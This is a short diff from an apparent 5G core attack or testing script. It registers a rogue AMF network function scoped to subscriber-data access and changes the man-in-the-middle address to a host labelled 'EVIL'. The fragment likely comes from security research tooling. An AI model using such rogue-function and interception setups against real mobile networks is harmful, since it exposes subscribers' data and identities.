@@ -6,7 +6,7 @@ import json
 nf_instance_id = generate_variables("uuid")
 token = setup_rogue(nf_instance_id, nf_type="AMF", scope="nudm-sdm")
 
-ip   = "http://10.100.200.1:8000/" # mitm ip
+ip   = f"http://{ip_list['EVIL']}:8000/" # mitm ip
 supi = "imsi-208930000000001"
 mcc  = "208"
 mnc  = "93"
